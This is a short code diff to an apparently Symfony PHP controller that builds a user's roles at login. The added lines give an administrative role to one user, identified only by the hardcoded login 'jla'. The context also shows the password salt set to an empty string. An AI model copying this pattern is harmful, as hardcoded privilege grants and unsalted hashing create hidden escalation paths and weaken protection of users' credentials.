@@ -372,6 +372,9 @@ class DefaultController extends Controller {
                 $tabRoles[] = 'ROLE_PRESTASQE';
             }
             $entityUser->setRoles($tabRoles);
+            if ($pgProgWebuser->getLogin() == 'jla'){
+                $entityUser->addRole('ROLE_ADMINEDL');
+            }
             $encoder = $factory->getEncoder($entityUser);
             $entityUser->setUsername($pgProgWebuser->getLogin());
             $entityUser->setSalt('');
